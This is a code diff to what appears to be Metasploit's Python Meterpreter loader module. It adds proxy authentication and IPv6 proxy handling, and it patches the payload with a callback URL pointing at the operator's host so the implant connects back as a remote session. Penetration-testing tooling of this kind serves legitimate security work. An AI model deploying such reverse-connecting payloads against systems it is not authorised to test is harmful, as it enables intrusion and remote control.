@@ -1,9 +1,5 @@
 # -*- coding: binary -*-
 
-require 'msf/core'
-require 'msf/core/payload/transport_config'
-require 'msf/base/sessions/meterpreter_options'
-require 'msf/core/payload/uuid/options'
 
 module Msf
 
@@ -71,7 +67,7 @@ module Payload::Python::MeterpreterLoader
     met = MetasploitPayloads.read('meterpreter', 'meterpreter.py')
 
     var_escape = lambda { |txt|
-      txt.gsub('\\', '\\'*8).gsub('\'', %q(\\\\\\\'))
+      txt.gsub('\\', '\\' * 8).gsub('\'', %q(\\\\\\\'))
     }
 
     unless ds['MeterpreterTryToFork']
@@ -102,6 +98,8 @@ module Payload::Python::MeterpreterLoader
     http_user_agent = opts[:http_user_agent] || ds['HttpUserAgent']
     http_proxy_host = opts[:http_proxy_host] || ds['HttpProxyHost'] || ds['PROXYHOST']
     http_proxy_port = opts[:http_proxy_port] || ds['HttpProxyPort'] || ds['PROXYPORT']
+    http_proxy_user = opts[:http_proxy_user] || ds['HttpProxyUser']
+    http_proxy_pass = opts[:http_proxy_pass] || ds['HttpProxyPass']
     http_header_host = opts[:header_host] || ds['HttpHostHeader']
     http_header_cookie = opts[:header_cookie] || ds['HttpCookie']
     http_header_referer = opts[:header_referer] || ds['HttpReferer']
@@ -115,7 +113,7 @@ module Payload::Python::MeterpreterLoader
       uri = "/#{opts[:url].split('/').reject(&:empty?)[-1]}"
       opts[:scheme] ||= opts[:url].to_s.split(':')[0]
       scheme, lhost, lport = transport_uri_components(opts)
-      callback_url = "#{scheme}://#{lhost}:#{lport}#{ds['LURI']}#{uri}/"
+      callback_url = "#{scheme}://#{lhost}:#{lport}#{luri}#{uri}/"
 
       # patch in the various payload related configuration
       met.sub!('HTTP_CONNECTION_URL = None', "HTTP_CONNECTION_URL = '#{var_escape.call(callback_url)}'")
@@ -125,8 +123,14 @@ module Payload::Python::MeterpreterLoader
       met.sub!('HTTP_REFERER = None', "HTTP_REFERER = '#{var_escape.call(http_header_referer)}'") if http_header_referer.to_s != ''
 
       if http_proxy_host.to_s != ''
-        proxy_url = "http://#{http_proxy_host}:#{http_proxy_port}"
-        met.sub!('HTTP_PROXY = None', "HTTP_PROXY = '#{var_escape.call(proxy_url)}'")
+        http_proxy_url = "http://"
+        unless http_proxy_user.to_s == '' && http_proxy_pass.to_s == ''
+          http_proxy_url << "#{Rex::Text.uri_encode(http_proxy_user)}:#{Rex::Text.uri_encode(http_proxy_pass)}@"
+        end
+        http_proxy_url << (Rex::Socket.is_ipv6?(http_proxy_host) ? "[#{http_proxy_host}]" : http_proxy_host)
+        http_proxy_url << ":#{http_proxy_port}"
+
+        met.sub!('HTTP_PROXY = None', "HTTP_PROXY = '#{var_escape.call(http_proxy_url)}'")
       end
     end
 
